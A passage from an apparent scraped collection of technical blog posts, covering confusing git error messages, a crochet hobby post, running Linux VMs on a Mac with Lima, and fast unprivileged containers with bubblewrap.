push\nTo github.com:jvns/int-exposed\n ! [rejected]        main -> main (non-fast-forward) \n error: failed to push some refs to 'github.com:jvns/int-exposed'\nhint: Updates were rejected because the tip of your current branch is behind\nhint: its remote counterpart. Integrate the remote changes (e.g.\nhint: 'git pull ...') before pushing again.\nhint: See the 'Note about fast-forwards' in 'git push --help' for details. \n\n$ git status\nOn branch main\nYour branch and 'origin/main' have diverged,\nand have 2 and 1 different commits each, respectively.\n \n\n Some things I find confusing about this: \n\n \n You get the exact same error message whether the branch is just  behind \nor the branch has  diverged . There’s no way to tell which it is from this\nmessage: you need to run  git status  or  git pull  to find out. \n It says  failed to push some refs , but it’s not totally clear  which  references it\nfailed to push. I believe everything that failed to push is listed with  ! [rejected]  on the previous line– in this case just the  main  branch. \n \n\n What I like to do if I’m confused: \n\n \n I’ll run  git status  to figure out what the state of my current branch is. \n I think I almost never try to push more than one branch at a time, so I\nusually totally ignore git’s notes about which specific branch failed to push\n– I just assume that it’s my current branch \n \n\n \n   \n  error:  git pull  on a diverged branch\n   \n \n\n \n$ git pull\n hint: You have divergent branches and need to specify how to reconcile them.\nhint: You can do so by running one of the following commands sometime before\nhint: your next pull:\nhint:\nhint:   git config pull.rebase false  # merge\nhint:   git config pull.rebase true   # rebase\nhint:   git config pull.ff only       # fast-forward only\nhint:\nhint: You can replace \"git config\" with \"git config --global\" to set a default\nhint: preference for all repositories. You can also pass --rebase, --no-rebase,\nhint: or --ff-only on the command line to override the configured default per\nhint: invocation. \nfatal: Need to specify how to reconcile divergent branches.\n \n\n The main thing I think is confusing here is that git is presenting you with a\nkind of overwhelming number of options: it’s saying that you can either: \n\n \n configure  pull.rebase false ,  pull.rebase true , or  pull.ff only  locally \n or configure them globally \n or run  git pull --rebase  or  git pull --no-rebase \n \n\n It’s very hard to imagine how a beginner to git could easily use this hint to\nsort through all these options on their own. \n\n If I were explaining this to a friend, I’d say something like “you can use  git pull --rebase \nor  git pull --no-rebase  to resolve this with a rebase or merge\n right now , and if you want to set a permanent preference, you can do that\nwith  git config pull.rebase false  or  git config pull.rebase true . \n\n git config pull.ff only  feels a little redundant to me because that’s git’s\ndefault behaviour anyway (though it wasn’t always). \n\n What I like to do here: \n\n \n run  git status  to see the state of my current branch \n maybe run  git log origin/main  or  git log  to see what the diverged commits are \n usually run  git pull --rebase  to resolve it \n sometimes I’ll run  git push --force  or  git reset --hard origin/main  if I\nwant to throw away my local work or remote work (for example because I\naccidentally commited to the wrong branch, or because I ran  git commit\n--amend  on a personal branch that only I’m using and want to force push) \n \n\n \n   \n  error:  git checkout asdf  (a branch that doesn't exist)\n   \n \n\n \n$ git checkout asdf\nerror: pathspec 'asdf' did not match any file(s) known to git\n \n\n This is a little weird because we my intention was to check out a  branch ,\nbut  git checkout  is complaining about a  path  that doesn’t exist. \n\n This is happening because  git checkout ’s first argument can be either a\nbranch or a path, and git has no way of knowing which one you intended. This\nseems tricky to improve, but I might expect something like “No such branch,\ncommit, or path: asdf”. \n\n What I like to do here: \n\n \n in theory it would be good to use  git switch  instead, but I keep using  git checkout  anyway \n generally I just remember that I need to decode this as “branch  asdf  doesn’t exist” \n \n\n \n   \n  error:  git switch asdf  (a branch that doesn't exist)\n   \n \n\n \n$ git switch asdf\nfatal: invalid reference: asdf\n \n\n git switch  only accepts a branch as an argument (unless you pass  -d ), so why is it saying  invalid\nreference: asdf  instead of  invalid branch: asdf ? \n\n I think the reason is that internally,  git switch  is trying to be helpful in its error messages: if you run  git switch v0.1  to switch to a tag, it’ll say: \n\n $ git switch v0.1\nfatal: a branch is expected, got tag 'v0.1'`\n \n\n So what git is trying to communicate with  fatal: invalid reference: asdf  is\n“ asdf  isn’t a branch, but it’s not a tag either, or any other reference”. From my various  git polls  my impression is that\na lot of git users have literally no idea what a “reference” is in git, so I’m not sure if that’s coming across. \n\n What I like to do here: \n\n 90% of the time when a git error message says  reference  I just mentally\nreplace it with  branch  in my head. \n\n \n  error:  git checkout HEAD^ \n \n\n $ git checkout HEAD^\nNote: switching to 'HEAD^'.\n\nYou are in 'detached HEAD' state. You can look around, make experimental\nchanges and commit them, and you can discard any commits you make in this\nstate without impacting any branches by switching back to a branch.\n\nIf you want to create a new branch to retain commits you create, you may\ndo so (now or later) by using -c with the switch command. Example:\n\n  git switch -c  \n\nOr undo this operation with:\n\n  git switch -\n\nTurn off this advice by setting config variable advice.detachedHead to false\n\nHEAD is now at 182cd3f add \"swap byte order\" button\n \n\n \nThis is a tough one. Definitely a lot of people are confused about this\nmessage, but obviously there's been a lot of effort to improve it too. I don't\nhave anything smart to say about this one.\n \n\n What I like to do here: \n\n \n my shell prompt tells me if I’m in detached HEAD state, and generally I can remember not to make new commits while in that state \n when I’m done looking at whatever old commits I wanted to look at, I’ll run  git checkout main  or something to go back to a branch \n \n\n \n   \n  message:  git status  when a rebase is in progress\n     \n \n\n This isn’t an error message, but I still find it a little confusing on its own: \n\n \n$ git status\n interactive rebase in progress;  onto c694cf8\nLast command done (1 command done):\n   pick 0a9964d wip\nNo commands remaining.\nYou are currently rebasing branch 'main' on 'c694cf8'.\n  (fix conflicts and then run \"git rebase --continue\")\n  (use \"git rebase --skip\" to skip this patch)\n  (use \"git rebase --abort\" to check out the original branch)\n\nUnmerged paths:\n  (use \"git restore --staged  ...\" to unstage)\n  (use \"git add  ...\" to mark resolution)\n   both modified:   index.html \n\nno changes added to commit (use \"git add\" and/or \"git commit -a\")\n \n\n Two things I think could be clearer here: \n\n \n I think it would be nice if  You are currently rebasing branch 'main' on 'c694cf8'.  were on the first line instead of the 5th line – right now the first line doesn’t say which branch you’re rebasing. \n In this case,  c694cf8  is actually  origin/main , so I feel like  You are currently rebasing branch 'main' on 'origin/main'  might be even clearer. \n \n\n What I like to do here: \n\n My shell prompt includes the branch that I’m currently rebasing, so I rely on that instead of the output of  git status . \n\n \n   \n  error:  git rebase  when a file has been deleted\n   \n \n \n$ git rebase main\nCONFLICT (modify/delete): index.html deleted in 0ce151e (wip) and modified in HEAD.  Version HEAD of index.html left in tree.\nerror: could not apply 0ce151e… wip\n \n\n The thing I still find confusing about this is –  index.html  was modified in\n HEAD . But what is  HEAD ? Is it the commit I was working on when I started\nthe merge/rebase, or is it the commit from the other branch? (the answer is\n“ HEAD  is your branch if you’re doing a merge, and it’s the “other branch” if\nyou’re doing a rebase, but I always find that hard to remember) \n\n I think I would personally find it easier to understand if the message listed the branch names if possible, something like this: \n\n CONFLICT (modify/delete): index.html deleted on `main` and modified on `mybranch`\n \n\n \n   \n  error:  git status  during a merge or rebase (who is “them”?)\n   \n \n \n$ git status\nOn branch master\nYou have unmerged paths.\n  (fix conflicts and run “git commit”)\n  (use “git merge –abort” to abort the merge)\n\n Unmerged paths:\n  (use “git add/rm  …” as appropriate to mark resolution)\n    deleted by them: the_file \n\n no changes added to commit (use “git add” and/or “git commit -a”)\n \n\n I find this one confusing in exactly the same way as the previous message: it\nsays  deleted by them: , but what “them” refers to depends on whether you did a merge or rebase or cherry-pick. \n\n \n for a merge,  them  is the other branch you merged in \n for a rebase,  them  is the branch that you were on when you ran  git rebase \n for a cherry-pick, I guess it’s the commit you cherry-picked \n \n\n What I like to do if I’m confused: \n\n \n try to remember what I did \n run  git show main --stat  or something to see what I did on the  main  branch if I can’t remember \n \n\n \n   \n  error:  git clean \n   \n \n \n$ git clean\nfatal: clean.requireForce defaults to true and neither -i, -n, nor -f given; refusing to clean\n \n\n I just find it a bit confusing that you need to look up what  -i ,  -n  and\n -f  are to be able to understand this error message. I’m personally way too\nlazy to do that so even though I’ve probably been using  git clean  for 10\nyears I still had no idea what  -i  stood for ( interactive ) until I was\nwriting this down. \n\n What I like to do if I’m confused: \n\n Usually I just chaotically run  git clean -f  to delete all my untracked files\nand hope for the best, though I might actually switch to  git clean -i   now\nthat I know what  -i  stands for. Seems a lot safer. \n\n that’s all! \n\n Hopefully some of this is helpful! \n\n"},
{"url": "https://jvns.ca/blog/2024/04/01/making-crochet-cacti/", "title": "Making crochet cacti", "content": "\n     \n\n I noticed some tech bloggers I follow have been making  April Cools Day  posts about topics they don’t normally write\nabout (like  decaf  or  microscopes ). The goal isn’t to\ntrick anyone, just to write about something different for a day. \n\n I thought those posts were fun so here is a post with some notes on learning to crochet tiny cacti. \n\n first, the cacti \n\n I’ve been trying to do some non-computer hobbies, without putting a lot of\npressure on myself to be “good” at them. Here are some cacti I crocheted: \n\n \n\n They are a little wonky and I like them. \n\n a couple of other critters \n\n Here are a couple of other things I made: an elephant, an orange guy, a\nmuch earlier attempt at a cactus, and an in-progress cactus \n\n \n \n \n \n\n Some of these are also pretty wonky, but sometimes it adds to the charm: for\nexample the elephant’s head is attached at an angle which was not on purpose\nbut I think adds to the effect. ( orange guy pattern ,  elephant pattern ) \n\n I haven’t really been making clothing: I like working in a pretty chaotic way\nand I think you need to be a lot more careful when you make clothing so that it\nwill actually fit. \n\n the first project: a mouse \n\n The first project I made was this little  mouse . It took me a few\nhours (maybe 3 hours?) and I made a lot of mistakes and it definitely was not\nas cute as it was in the pictures in the pattern, but it was still good! I\ncan’t find a picture right now though. \n\n buying patterns is great \n\n Originally I started out using free patterns, but I found some cacti patterns I really liked in an ebook called  Knotmonsters: Cactus Gardens Edition , so I bought it. \n\n I like the patterns in that book and also buying patterns seems like a nice way\nto support people who are making fun patterns. I found  this guide to designing your own patterns  through\nsearching on Ravelry and it seems like a lot of work! Maybe I will do it one\nday but for now I appreciate the\nwork of other people who make the patterns. \n\n modifying patterns chaotically is great too \n\n I’ve been modifying all of the patterns I make in a somewhat chaotic way, often\njust because I made a mistake somewhere along the way and then decide to move\nforward and change the pattern to adjust for the mistake instead of undoing my\nwork. Some of of the changes I’ve made are: \n\n \n remove rows \n put fewer stitches in a row \n use a different stitch \n \n\n This doesn’t always work but often it works well enough, and I think all of the\nmistakes help me learn. \n\n no safety eyes \n\n A lot of the patterns I’ve been seeing for animals suggest using “safety eyes”\n(plastic eyes). I didn’t really feel like buying those , so I’ve been\nembroidering eyes on instead. “Embroidering” might not be accurate, really I\njust sew some black yarn on in a haphazard way and hope it doesn’t come out\nlooking too weird. \n\n My crochet kit came with a big plastic yarn needle that I’ve been using to\nembroider and also \n\n no stitch markers \n\n My crochet kit came with some plastic “stitch markers” which you can use to\nfigure out where the beginning of your row is, so you know when you’re done.\nI’ve been finding it easier to just use a short piece of scrap yarn instead. \n\n on dealing with all the counting \n\n In crochet there is a LOT of counting. Like “single crochet 3 times, then\ndouble crochet 1 time, then repeat that 6 times”. I find it hard to do that\naccurately without making mistakes, and all of the counting is not that fun! A\nfew things that have helped: \n\n \n go back and look at my stitches to see what I did (“have I done 1 single\ncrochet, or 2?“). I’m not actually very good at doing this, but I find it\neasier to see my stitches with wool/cotton yarn than with acrylic yarn for\nsome reason. \n count how many stitches in total I’ve done since the last row, and make sure\nit seems approximately right (“well, I’m supposed to have 20 stitches and I\nhave 19, that’s pretty close!“). Then I’ll maybe just add an extra stitch in\nthe wrong place to adjust, or maybe just leave it the way it is. \n \n\n notes on yarn \n\n So far I’ve tried three kinds of yarn: merino (for the elephant), cotton (for\nthe cacti), and acrylic (for the orange dude). I still don’t know\nwhich one I like best, but since I’m doing small projects it feels like the\nright move is still to just buy small amounts of yarn and experiment. I think I\nlike the cotton and merino more than the acrylic. \n\n For the cacti I used  Ricorumi  cotton yarn,\nwhich comes in tiny balls (which is good for me because if I don’t end up\nliking it, I don’t have a lot of extra!) and in a lot of different colours. \n\n There are a lot of yarn weights (lace! sock! sport! DK! worsted! bulky! and\nmore!). I don’t really underestand them yet but I think so far I’ve been mostly\nusing DK and worsted yarn. \n\n hook size? who knows! \n\n I’ve mostly been using a 3.5mm hook, probably because I read a tutorial that\nsaid to use a 3.5mm hook. It seems to work fine! I used a larger hook size when\nmaking a hat, and that also worked. \n\n I still don’t really know how to choose hook sizes but that doesn’t seem to\nhave a lot of consequences when making cacti. \n\n every stitch I’ve learned \n\n I think I’ve probably only learned how to do 5 things in crochet so far: \n\n \n magic ring (mr) \n single crochet (sc) \n half double crochet (hdc) \n front post half double crochet (fphdc) \n double crochet (dc) \n back loops only/front loops only (flo/blo) \n increase/decrease \n \n\n The way I’ve been approaching learning new crochet stitches is: \n\n \n find a pattern I want to make \n start it without reviewing it very much at all \n when I get to a stitch I don’t know, watch youtube videos \n don’t watch it very carefully and get it wrong \n eventually realize that it doesn’t look right at all, rewatch the video, and continue \n \n\n I’ve been using  Sarah Maker ’s pages a lot, except for the magic ring where I used  this 3-minute youtube video . \n\n The magic ring took me a very long time to learn to do correctly, I didn’t pay\nattention very closely to the 3-minute youtube video so I did it wrong in maybe\n4 projects before I figured out how to do it right. \n\n every single thing I’ve bought \n\n So far I’ve only needed: \n\n \n a crochet kit (which I got as a gift). it came with yarn, a bunch of crochet needles in different sizes, big sewing needles, and some other things I haven’t needed yet. \n some Ricorumi cotton (for the cacti) \n 1 ball of gray yarn (for the elephant) \n \n\n I’ve been trying to not buy too much stuff, because I never know if I’ll get\nbored with a new hobby, and if I get bored it’s annoying to have a bunch of\nstuff lying around. Some examples of things I’ve avoided buying so far: \n\n \n Instead of buying polyester fiberfill, to fill all of the critters I’ve just\nbeen cutting up an old sweater I have that was falling apart. \n I’ve been embroidering the eyes instead of buying safety eyes \n \n\n Everything I have right now fits in a the box the crochet kit came in (which is\nabout the size of a large shoebox), and my plan is to keep it that way for a\nwhile. \n\n that’s all! \n\n Mainly what I like about crochet so far is that: \n\n \n it’s a way to not be on the computer, and you can chat with people while doing it \n you can do it without buying too much stuff, it’s pretty compact \n I end up with cacti in our living room which is great (I also have a bunch of real succulents, so they go with those) \n it seems extremely forgiving of mistakes and experimentation \n \n\n There are definitely still a lot of things I’m doing “wrong” but it’s fun to\nlearn through trial and error. \n\n"},
{"url": "https://jvns.ca/blog/2023/07/10/lima--a-nice-way-to-run-linux-vms-on-mac/", "title": "Lima: a nice way to run Linux VMs on Mac", "content": "\n     \n\n Hello! Here’s a new entry in the “cool software julia likes” section. \n\n A little while ago I started using a Mac, and one of my biggest\nfrustrations with it is that often I need to run Linux-specific software. For\nexample, the  nginx playground  I\nposted about the other day only works on Linux because it uses Linux namespaces (via  bubblewrap )\nto sandbox nginx. And I’m working on another playground right now that uses bubblewrap too. \n\n This post is very short, it’s just to say that Lima seems nice and much simpler\nto get started with than Vagrant. \n\n enter Lima! \n\n I was complaining about this to a friend, and they mentioned\n Lima , which stands for  Li nux on  Ma c. I’d heard\nof  colima  (another way to run Linux\ncontainers on Mac), but I hadn’t realized that Lima also just lets you run VMs. \n\n It was surprisingly simple to set up. I just had to: \n\n \n Install Lima (I did  nix-env -iA nixpkgs.lima  but you can also install it with  brew install lima ) \n Run  limactl start default  to start the VM \n Run  lima  to get a shell \n \n\n That’s it! By default it mounts your home directory as read-only inside the VM \n\n There’s a config file in  ~/.lima/default/lima.yaml , but I haven’t needed to change it yet. \n\n some nice things about Lima \n\n Some things I appreciate about Lima (as opposed to Vagrant which I’ve used in the past and found kind of frustrating) are: \n\n \n it provides a default config \n it automatically downloads a Ubuntu 22.04 image to use in the VM (which is what I would have probably picked anyway) \n it mounts my entire home directory inside the VM, which I really like as a default choice (it feels very seamless) \n \n\n I think the paradigm of “I have a single chaotic global Linux VM which I use\nfor all my projects” might work better for me than super carefully configured\nper-project VMs. Though I’m sure that you can have carefully configured\nper-project VMs with Lima too if you want, I’m just only using the  default  VM. \n\n problem 1: I don’t know how to mount directories read-write \n\n I wanted to have my entire home directory mounted read-only, but have some\nsubdirectories (like  ~/work/nginx-playground ) mounted read-write. I did some\nresearch and here’s what I found: \n\n \n a comment on  this github issue  says that you can use  mountType: “virtiofs” and vmType: “vz”  to mount subdirectories of your home directory read-write \n the Lima version packaged in nix 23.05 doesn’t seem to support  vmType: vz  (though I could be wrong about this) \n \n\n Maybe I’ll figure out how to mount directories read-write later, I’m not too\nbothered by working around it for now. \n\n problem 2: networking \n\n I’m trying to set up some weird networking stuff ( this tun/tap setup )\nin Lima and while it appeared to work at first, actually the  tun  network\ndevice seems to be unreliable in a weird way for reasons I don’t understand. \n\n Another weird Lima networking thing: here’s what gets printed out when I ping a machine: \n\n $ ping 8.8.8.8\nPING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.\nping: Warning: time of day goes back (-7148662230695168869us), taking countermeasures\nping: Warning: time of day goes back (-7148662230695168680us), taking countermeasures\n64 bytes from 8.8.8.8: icmp_seq=0 ttl=255 time=0.000 ms\nwrong data byte #16 should be 0x10 but was 0x0\n#16\t0 6 0 1 6c 55 ad 64 0 0 0 0 72 95 9 0 0 0 0 0 10 11 12 13 14 15 16 17 18 19 1a 1b\n#48\t1c 1d 1e 1f 20 21 22 23\nping: Warning: time of day goes back (-6518721232815721329us), taking countermeasures\n64 bytes from 8.8.8.8: icmp_seq=0 ttl=255 time=0.000 ms (DUP!)\nwrong data byte #16 should be 0x10 but was 0x0\n#16\t0 6 0 2 6d 55 ad 64 0 0 0 0 2f 9d 9 0 0 0 0 0 10 11 12 13 14 15 16 17 18 19 1a 1b\n#48\t1c 1d 1e 1f 20 21 22 23\nping: Warning: time of day goes back (-4844789546316441458us), taking countermeasures\n64 bytes from 8.8.8.8: icmp_seq=0 ttl=255 time=0.000 ms (DUP!)\nwrong data byte #16 should be 0x10 but was 0x0\n#16\t0 6 0 3 6e 55 ad 64 0 0 0 0 69 b3 9 0 0 0 0 0 10 11 12 13 14 15 16 17 18 19 1a 1b\n#48\t1c 1d 1e 1f 20 21 22 23\nping: Warning: time of day goes back (-3834857329877608539us), taking countermeasures\n64 bytes from 8.8.8.8: icmp_seq=0 ttl=255 time=0.000 ms (DUP!)\nwrong data byte #16 should be 0x10 but was 0x0\n#16\t0 6 0 4 6f 55 ad 64 0 0 0 0 6c c0 9 0 0 0 0 0 10 11 12 13 14 15 16 17 18 19 1a 1b\n#48\t1c 1d 1e 1f 20 21 22 23\nping: Warning: time of day goes back (-2395394298978302982us), taking countermeasures\n64 bytes from 8.8.8.8: icmp_seq=0 ttl=255 time=0.000 ms (DUP!)\nwrong data byte #16 should be 0x10 but was 0x0\n#16\t0 6 0 5 70 55 ad 64 0 0 0 0 65 d3 9 0 0 0 0 0 10 11 12 13 14 15 16 17 18 19 1a 1b\n#48\t1c 1d 1e 1f 20 21 22 23\n \n\n This seems to be a  known issue with ICMP . \n\n why not use containers? \n\n I wanted a VM and not a Linux container because: \n\n \n the playground runs on a VM in production, not in a container, and generally\nit’s easier to develop in a similar environment to production \n all of my playgrounds use Linux namespaces, and I don’t know how to create a\nnamespace inside a container. Probably you can but I don’t feel like\nfiguring it out and it seems like an unnecessary distraction. \n on Mac you need to run containers inside a Linux VM anyway, so I’d rather\nuse a VM directly and not introduce another unnecessary layer \n \n\n OrbStack seems nice too \n\n After I wrote this, a bunch of people commented to say that\n OrbStack  is great. I was struggling with the\nnetworking in Lima (like I mentioned above) so I tried out OrbStack and the network does seem to be better. \n\n ping  acts normally, unlike in Lima: \n\n $ ping 8.8.8.8\nPING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.\n64 bytes from 8.8.8.8: icmp_seq=1 ttl=113 time=19.8 ms\n64 bytes from 8.8.8.8: icmp_seq=2 ttl=113 time=15.9 ms\n64 bytes from 8.8.8.8: icmp_seq=3 ttl=113 time=23.1 ms\n64 bytes from 8.8.8.8: icmp_seq=4 ttl=113 time=22.7 ms\n \n\n The setup steps for OrbStack are: \n\n \n Download OrbStack from the website \n In the GUI, create a VM \n Run  orb \n That’s it \n \n\n So it seems equally simple to set up. \n\n that’s all! \n\n Some other notes: \n\n \n It looks like Lima works on Linux too \n a bunch of people on Mastodon also said  colima  (built on top of Lima) is a nice Docker alternative on Mac for running Linux containers \n \n\n"},
{"url": "https://jvns.ca/blog/2022/06/28/some-notes-on-bubblewrap/", "title": "Notes on running containers with bubblewrap", "content": "\n     \n\n Hello! About a year ago I got mad about Docker container startup time. This was\nbecause I was building an  nginx playground \nwhere I was starting a new “container” on every HTTP request, and so for it to\nfeel reasonably snappy, nginx needed to start quickly. \n\n Also, I was running this project on a pretty small cloud machine (256MB RAM), a\nsmall CPU, so I really wanted to avoid unnecessary overhead. \n\n I’ve been looking for a way to run containers faster since then, but I couldn’t\nfind one until last week when I discovered\n bubblewrap !! It’s very fast and I\nthink it’s super cool, but I also ran into a bunch of fun problems that I\nwanted to write down for my future self. \n\n some disclaimers \n\n \n I’m not sure if the way I’m using bubblewrap in this post is maybe not how it’s intended to be used \n there are a lot of sharp edges when using bubblewrap in this way, you need to\nthink a lot about Linux namespaces and how containers work \n bubblewrap is a security tool but I am not a security person and I am only\ndoing this for weird tiny projects. you should definitely not take security\nadvice from me. \n \n\n Okay, all of that said, let’s talk about I’m trying to use bubblewrap to run\ncontainers fast and in a relatively secure way :) \n\n Docker containers take ~300ms to start on my machine \n\n I ran a quick benchmark to see how long a Docker container takes to run a\nsimple command ( ls ). For both Docker and Podman, it’s about 300ms. \n\n $ time docker run --network none -it ubuntu:20.04 ls / > /dev/null\nExecuted in  378.42 millis \n$ time podman run --network none -it ubuntu:20.04 ls / > /dev/null\nExecuted in  279.27 millis\n \n\n Almost all of this time is overhead from docker and podman – just running  ls \nby itself takes about 3ms: \n\n $ time ls / > /dev/null\nExecuted in    2.96 millis \n \n\n I want to stress that, while I’m not sure exactly what the slowest part of\nDocker and podman startup time is (I spent 5 minutes trying to profile them and\ngave up), I’m 100% sure it’s something important. \n\n The way we’re going to run containers faster with bubblewrap has a lot of\nlimitations and it’s a lower level interface which is a lot trickier to use. \n\n goal 1: containers that start quickly \n\n I felt like it  should  be possible to have containers that start essentially\ninstantly or at least in less than 5ms. My thought process: \n\n \n creating a new namespace with  unshare  is basically instant \n containers are basically just a bunch of namespaces \n what’s the problem? \n \n\n container startup time is (usually) not that important \n\n Most of the time when people are using containers, they’re running some\nlong-running process inside the container like a webserver, so it doesn’t\nreally matter if it takes 300ms to start. \n\n So it makes sense to me that there aren’t a lot of container tools that\noptimize for startup time. But I still wanted to optimize for startup time :) \n\n goal 2: run the containers as an unprivileged user \n\n Another goal I had was to be able to run my containers as an unprivileged user\ninstead of root. \n\n I was surprised the first time I learned that Docker actually runs containers\nas root – even though I run  docker run ubuntu:20.04  as an unprivileged user ( bork ), that\nmessage is actually sent to a daemon running as root, and the Docker container\nprocess itself also runs as root (albeit a  root  that’s stripped of all its\ncapabilities). \n\n That’s fine for Docker (they have lots of very smart people making sure that\nthey get it right!), but if I’m going to do container stuff  without  using\nDocker (for the speed reasons mentioned above), I’d rather not do it as root to\nkeep everything a bit more secure. \n\n podman can run containers as an non-root user \n\n Before we start talking about how to do weird stuff with bubblewrap, I want to\nquickly talk about a much more normal tool to run containers: podman! \n\n Podman, unlike Docker, can run containers as an unprivileged user! \n\n If I run this from my normal user: \n\n $ podman run -it ubuntu:20.04 ls\n \n\n it doesn’t secretly run as root behind the scenes! It just starts the container\nas my normal user, and then uses something called “user namespaces” so that\n inside the container  I appear to be root. \n\n The other cool thing about podman is that it has exactly the same interface as\nDocker, so you can just take a Docker command and replace  docker  with\n podman  and it’ll Just Work. I’ve found that sometimes I need to do some extra\nwork to get podman to work in practice, but it’s still pretty nice that it has\nthe same command line interface. \n\n This “run containers as a non-root user” feature is normally called “rootless\ncontainers”. (I find that name kind of counterintuitive, but that’s what people call it) \n\n failed attempt 1: write my own tool using  runc \n\n I knew that Docker and podman use\n runc  (or maybe  crun ? I can’t keep track honestly) under the hood, so I thought –\nwell, maybe I can just use  runc  directly to make my own tool that starts\ncontainers faster than Docker does! \n\n I tried to do this 6 months ago and I don’t remember most of the details, but basically\nI spent 8 hours working on it, got frustrated because I couldn’t get anything\nto work, and gave up. \n\n One specific detail I remember struggling with was setting up a working  /dev \nfor my programs to use. \n\n enter bubblewrap \n\n Okay, that was a very long preamble so let’s get to the point! Last week, I\ndiscovered a tool called  bubblewrap  that was basically exactly the thing I\nwas trying to build with  runc  in my failed attempt, except that it actually\nworks and has many more features and it’s built by people who know things about\nsecurity! Hooray! \n\n The interface to bubblewrap is pretty different than the interface to Docker –\nit’s much lower level.  There’s no concept of a container image – instead you\nmap a bunch of directories on your host to directories in the container. \n\n For example, here’s how to run a container with the same root directory as your\nhost operating system, but with only read access to that root directory, and only write access to  /tmp . \n\n bwrap \\\n    --ro-bind / / \\\n    --bind /tmp /tmp \\\n    --proc /proc --dev /dev \\\n    --unshare-pid \\\n    --unshare-net \\\n    bash\n \n\n For example, you could imagine running some untrusted process under bubblewrap\nthis way and then putting all the files you want the process to be able to access in  /tmp . \n\n bubblewrap runs containers as an unprivileged (non-root) user \n\n Like podman, bubblewrap runs containers as a non-root user, using user\nnamespaces. It can also run containers as root, but in this post we’re just\ngoing to be talking about using it as an unprivileged user. \n\n bubblewrap is fast \n\n Let’s see how long it takes to run  ls  in a bubblewrap container! \n\n $ time bwrap --ro-bind / / --proc /proc --dev /dev --unshare-pid ls /\nExecuted in    8.04 millis\n \n\n That’s a big difference! 8ms is a lot faster than 279ms. \n\n Of course, like we said before, the reason bubblewrap is faster is that it does\na lot less. So let’s talk about some things bubblewrap doesn’t do. \n\n some things bubblewrap doesn’t do \n\n Here are some things that Docker/podman do that bubblewrap doesn’t do: \n\n \n set up overlayfs mounts for you, so that your changes to the filesystem don’t affect the base image \n set up networking bridges so that you can connect to a webserver inside the container \n probably a bunch more stuff that I’m not thinking of \n \n\n In general, bubblewrap is a much lower level tool than something like Docker. \n\n Also, bubblewrap seems to have pretty different goals than Docker – the README\nseems to say that it’s intended as a tool for sandboxing desktop software (I\nthink it comes from  flatpak ). \n\n running a container image with bubblewrap \n\n I couldn’t find instructions for running a Docker container image with\nbubblewrap, so here they are. Basically I just use Docker to download the\ncontainer image and put it into a directory and then run it with  bwrap : \n\n There’s also a tool called  bwrap-oci  which looks cool but I\ncouldn’t get it to compile. \n\n mkdir rootfs\ndocker export $(docker create frapsoft/fish) | tar -C rootfs -xf -\nbwrap \\\n    --bind $PWD/rootfs / \\\n    --proc /proc --dev /dev \\\n    --uid 0 \\\n    --unshare-pid \\\n    --unshare-net \\\n    fish\n \n\n One important thing to note is that this doesn’t create a temporary overlay\nfilesystem for the container’s file writes, so it’ll let the container edit\nfiles in the image. \n\n I wrote a post about  overlay filesystems  if\nyou want to see how you could do that yourself though. \n\n running “containers” with bubblewrap isn’t the same as with podman \n\n I just gave an example of how to “run a container” with bubblewrap, and you\nmight think “cool, this is just like podman but faster!”. It is not, and it’s\nactually unlike using podman in even more ways than I expected. \n\n I put “container” in scare quotes because there are two ways to define “container”: \n\n \n something that implements  OCI runtime specification \n any way of running a process in a way that’s somehow isolated from the host system \n \n\n bubblewrap is a “container” tool in the second sense. It definitely provides\nisolation, and it does that using the same features – Linux namespaces – as\nDocker. \n\n But it’s not a container tool in the first sense. And it’s a lower level tool\nso you can get into a bunch of weird states and you really need to think about\nall the weird details of how container work while using it. \n\n For the rest of the post I’m going to talk about some weird things that can\nhappen with bubblewrap that would not happen with podman/Docker. \n\n weird thing 1: processes that don’t exist \n\n Here’s an example of a weird situation I got into with bubblewrap that confused\nme for a minute: \n\n $ bwrap --ro-bind / / --unshare-all bash\n$ ps aux\n... some processes\nroot      390073  0.0  0.0   2848   124 pts/9    S    14:28   0:00 bwrap --ro-bind / / --unshare-all --uid 0 bash\n... some other processes\n$ kill 390073\nbash: kill: (390073) - No such process\n$ ps aux | grep 390073\nroot      390073  0.0  0.0   2848   124 pts/9    S    14:28   0:00 bwrap --ro-bind / / --unshare-all --uid 0 bash\n \n\n Here’s what happened \n\n \n I started a bash shell inside bubblewrap \n I ran  ps aux , and saw a process with PID   390073 \n I try to kill the process. It fails with the error  no such process . What? \n I ran  ps aux , and still see the process with PID   390073 \n \n\n What’s going on? Why doesn’t the process  390073  exist, even though  ps  says it does? Isn’t that impossible? \n\n Well, the problem is that  ps  doesn’t actually list all the processes in your\ncurrent PID namespace. Instead, it iterates through all the entries in  /proc \nand prints those out. Usually, what’s in  /proc  is actually the same as the processes on your system. \n\n But with Linux containers these things can get out of sync. What’s happening in\nthis example is that we have the  /proc  from the host PID namespace, but those\naren’t actually the processes that we have access to in our PID namespace. \n\n Passing  --proc /proc  to bwrap fixes the issue –  ps  then actually lists the correct processes. \n\n $ bwrap --ro-bind / / --unshare-all --dev /dev --proc /proc ps aux\nUSER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND\nbork           1  0.0  0.0   3644   136 ?        S+   16:21   0:00 bwrap --ro-bind / / --unshare-all --dev /dev --proc /proc ps au\nbork           2  0.0  0.0  21324  1552 ?        R+   16:21   0:00 ps aux\n \n\n Just 2 processes! Everything is normal! \n\n weird thing 2: trying to listen on port 80 \n\n Passing  --uid 0  to bubblewrap makes the user inside the container  root . You\nmight think that this means that the root user has administrative privileges\ninside the container, but that’s not true! \n\n For example, let’s try to listen on port 80: \n\n $ bwrap --ro-bind / / --unshare-all --uid 0 nc -l 80\nnc: Permission denied\n \n\n What’s going on here is that the new root user actually doesn’t have the\n capabilities  it needs to listen on port 80. (you need special permissions\nto listen on ports less than 1024, and 80 is less than 1024) \n\n There’s actually a capability specifically for listening on privileged ports\ncalled  CAP_NET_BIND_SERVICE . \n\n So to fix this all we need to do is to tell bubblewrap to give our user that\ncapability. \n\n $ bwrap --ro-bind / / --unshare-all --uid 0 --cap-add cap_net_bind_service nc -l 80\n(no output, success!!!)\n \n\n This works! Hooray! \n\n finding the right capabilities is pretty annoying \n\n bubblewrap doesn’t give out any capabilities by default, and I find that\nfiguring out all the right capabilities and adding them manually is kind of\nannoying. Basically my process is \n\n \n run the thing \n see what fails \n read  man capabilities  to figure out what capabilities I’m missing \n add the capability with  --cap-add \n repeat until everything is running \n \n\n But that’s the price I pay for wanting things to be fast I guess :) \n\n 